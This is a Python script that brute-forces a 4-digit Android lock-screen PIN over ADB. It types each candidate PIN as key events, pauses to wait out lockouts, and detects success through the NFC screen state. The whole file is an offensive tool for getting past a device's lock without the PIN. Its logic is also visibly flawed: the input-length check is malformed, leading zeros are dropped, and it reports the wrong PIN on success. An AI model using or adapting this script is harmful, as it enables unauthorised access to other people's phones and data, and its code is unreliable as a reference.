from ppadb.client import Client as AdbClient
import time 
client = AdbClient(host='127.0.0.1', port=5037)
devices = client.devices()
if len(devices) == 0:
    print("No devices")
    quit()
device = devices[0]
print(f'Connected to device!')
snum = int(input("Enter the start digits(4 pin): "))
lnum = int(input("Enter the end digits (4 pin): "))
print("Starting test.......")
if len(str(snum)) and len(str(lnum)) > 4:
    print("Please enter 4 digits!")
else: 
    device.shell('input keyevent 26')
    device.shell('input keyevent 82')
    arr = { 0:7, 1:8, 2:9, 3:10, 4:11, 5:12, 6:13, 7:14, 8:15, 9:16 }
    for i in range (snum, lnum+1):
        num = i 
        sleeptime = snum 
        if num == snum+5:
            time.sleep(32)
            device.shell('input keyevent 26')
            device.shell('input keyevent 82')
        elif num == snum+10:
            time.sleep(32)
            device.shell('input keyevent 26')
            device.shell('input keyevent 82')
        x = [int(a) for a in str(num)]
        q = []
        for n in x:
            q.append(f'{arr[n]}')
        for qs in q:
            device.shell(f'input keyevent {qs}')
        device.shell('input keyevent 66') 
        unlock = device.shell("dumpsys nfc | grep 'mScreenState='")
        if "ON_UNLOCKED" in unlock: #mHoldingWakeLockSuspendBlocker=true':
            print(f'Password found: {num-1}')
            break 
        print(f"Tested Pin: {num}")    
